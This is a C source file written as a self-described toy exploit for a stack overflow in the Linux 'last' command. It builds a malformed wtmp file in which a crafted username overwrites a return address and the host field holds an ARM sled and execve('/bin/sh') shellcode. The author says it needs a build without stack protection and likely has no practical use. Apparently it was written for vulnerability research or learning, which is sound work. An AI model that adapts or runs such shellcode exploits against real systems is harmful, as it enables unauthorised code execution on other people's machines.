#include <utmpx.h>
#include <stdio.h>
#include <pwd.h>
#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <wchar.h>
#include <unistd.h>

#define UT_COUNT 2

// Description:
// A toy exploit for the 'last' command is_phantom stack overflow vulnerability (last.c:633).
// Generates a malformed wtmp file named mtmp (malformed-tmp)
// last needs to be compiled with flags "-O0 -fno-stack-protector"
// ASLR might be a thing too... basically, there is likely no practial use for this.

int main(int argc, char **argv) {
// Execve from https://azeria-labs.com/writing-arm-shellcode/
// thumb mode
    unsigned char shellcode[] = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78";
	struct utmpx *ut;
	struct passwd *pw;
	FILE *fp;
	int n;
    int sc_size;
    int ut_size;

    fprintf(stderr, "Phantom stack around: %p\n", &ut);
    sc_size = sizeof(shellcode) - 1; // ignore the null
    ut_size = sizeof(struct utmpx); // ignore the null
	ut = calloc(UT_COUNT, ut_size);

	if (ut == NULL) return -1;
	
	fprintf(stderr, "Allocated ut: %p\n", ut);

	//Prepare the space...
	ut->ut_type = USER_PROCESS;
	memset(ut, 0x61, ut_size);
	strcpy(ut->ut_user,"AAAAAAAAAAAAAAAAphantom\x9c\xf3\xff\x7eWXYZ"); //0x7e8c25a4
  // Build an ARM mode sled...
	wmemset((wchar_t *)&ut->ut_host, 0xe1a01001, __UT_HOSTSIZE / sizeof(wchar_t));
    memcpy(&ut->ut_host[__UT_HOSTSIZE - sc_size], shellcode, sc_size);

	//Pre-flight checks
	pw = getpwnam(ut->ut_user);
	if (pw == NULL) {
		printf("%s:x:65535:65535::/tmp:/usr/sbin/nologin\n", ut->ut_user);
		return -1;
	}

    if (access("mtmp", F_OK) != -1) {
        fprintf(stderr, "Found old mtmp, removing it...\n");
        if (remove("mtmp") != 0) {
    		fprintf(stderr, "Failed to remove mtmp...\n");
    		return -1;
        }
    }


    fprintf(stderr, "Opening new mtmp...\n");
	fp = fopen("mtmp", "w");
	if (fp == NULL)	{
		fprintf(stderr, "Failed to open...\n");
		return -1;
	}
	
    fprintf(stderr, "Writing mtmp...\n");
	n = fwrite(ut, sizeof(struct utmpx), UT_COUNT, fp);
	if (n < UT_COUNT) {
		fprintf(stderr, "Failed to write expected size... wrote: %d\n", n);
		return -1;
	}
	fclose(fp);
    return 0;
}
